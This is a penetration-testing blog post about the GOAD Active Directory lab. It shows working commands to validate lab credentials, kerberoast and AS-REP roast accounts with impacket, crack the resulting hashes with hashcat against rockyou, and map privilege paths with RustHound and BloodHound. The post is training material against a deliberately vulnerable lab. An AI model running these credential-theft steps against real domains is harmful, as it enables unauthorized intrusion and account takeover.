---
title: GOAD - Digging Deeper 
date: 2022-11-16 12:00:00
categories: [AD,GOAD]
tags: [goad]
---

# Description

In this blog post we will use the infos which we discovered in [GOAD - Enumeration](https://blog.kindel.it/posts/GOAD-Enumeration/)  to dig deeper and gather more data about our target and if we are lucky we're gonna find something valuable 

# User Account

We discovered a user account on our basic enumeration that had it's password documented in the desciption. Let's see if it helps us to uncover new details.

## Check validity

Creds: `north.sevenkingdoms.local/samwell.tarly:Heartsbane`

```bash
cme smb 192.168.56.11 -u 'samwell.tarly' -p 'Heartsbane'
# Validity confirmed by our matching DC  
# ldapsearch should also work and leaves, as far as I'm aware, a smaller footprint
```

# More User Enum

## Kerberoasting

To get a list of kerberoastable accounts of the domain `north.sevenkingdoms.local` we will use the credentials of `samwell.tarly`

```bash
# Obtaining the hashes
impacket-GetUserSPNs 'north.sevenkingdoms.local/samwell.tarly:Heartsbane' -outputfile loot_2/kerberoastable.txt
# Cracking hashes using hashcat
hashcat -m 13100 -a 0 -o loot_2/kerb_cracked.txt loot_2/kerberoastable.txt /usr/share/wordlists/rockyou.txt
# Managed to crack a password jon.snow:iknownothing
```

## Asreproasting

Another option to get our hands on crackable hashes is to check for asrep roastable accounts.  
You could either:
- Check every known account
- Only check those indicated as vulnerable by [Bloodhound](https://github.com/BloodHoundAD/BloodHound)

```bash
# Let's check every account that's currently known to us
impacket-GetNPUsers north.sevenkingdoms.local/ -usersfile loot/north.users.formatted.txt
# brandon.stark has set "DontReqPreAuth"
# Let's crack the hash
hashcat -m 18200 -a 0 -o loot_2/asrep_cracked.txt loot_2/asreproast.txt /usr/share/wordlists/rockyou.txt
# Successfull: brandon.stark:iseedeadpeople
```

# Bloodhound

Let's collect some infos about the domain `north.sevenkingdoms.local` and objects using [Rusthound](https://github.com/OPENCYBER-FR/RustHound). Feel free to use bloodhound-python or any other way you know :)

## Rusthound

Rusthound doesn't collect as much infos as sharphound but should be enough for this blog post

```bash
# Domain north.sevenkingdoms.local
rusthound -d north.sevenkingdoms.local -u 'samwell.tarly@north.sevenkingdoms.local' -p 'Heartsbane' -o ./loot_2/bloodhound -z
# Domain: sevenkindgoms.local
rusthound -d sevenkingdoms.local -u 'samwell.tarly@north.sevenkingdoms.local' -p 'Heartsbane' -o ./loot_2/bloodhound -z
# Domain: essos
FAILED
```

## Visualize

Start neo4j and [Bloodhound](https://github.com/BloodHoundAD/BloodHound)

```bash
sudo neo4j start
# --disable-gpu-sandbox should fix a bug when Bloodhound isn't starting
./BloodHound --disable-gpu-sandbox
```

## Findings

Using [Bloodhound](https://github.com/BloodHoundAD/BloodHound) and it's features we are able to identify a couple of things right away.  
This could help us reduce the noice within the domain as we don't have check every account that we know. We would be able to just retrieve the infos for those three and don't request infos for any other account.

### Kerberoastable Accounts
* sql_svc
* jon.snow

### ASREP Roastable Users
- brandon.stark

### Path to High Value Targets

We owned three users so far `samwell.tarly`, `brandon.stark`,  `jon.snow`. Let's look around in [Bloodhound](https://github.com/BloodHoundAD/BloodHound) and enumerate groups and special permissions that are associated to those accounts.

**Permissions Matrix**

| User          | Groups                                                 | Special                      |
| ------------- | ------------------------------------------------------ | ---------------------------- |
| samwell.tarly | Domain Users, Night Watch                              |                              |
| brandon.stark | Domain Users, Stark, Remote Desktop Users              |                              |
| jon.snow      | Domain Users, Night Watch, Stark, Remote Desktop Users | Constrained Delegation -> DC |

According to our research which we conducted jon.snow is a high value user. We are able to use his credentials to open a remote desktop session and can probably abuse his constrained delegation privileges

![jonsnow-deleg](/assets/img/goad/jonsnow-deleg.png)

In our next blog post we will start pwning systems using our so far collected credentials and get more infos for [Bloodhound](https://github.com/BloodHoundAD/BloodHound).  
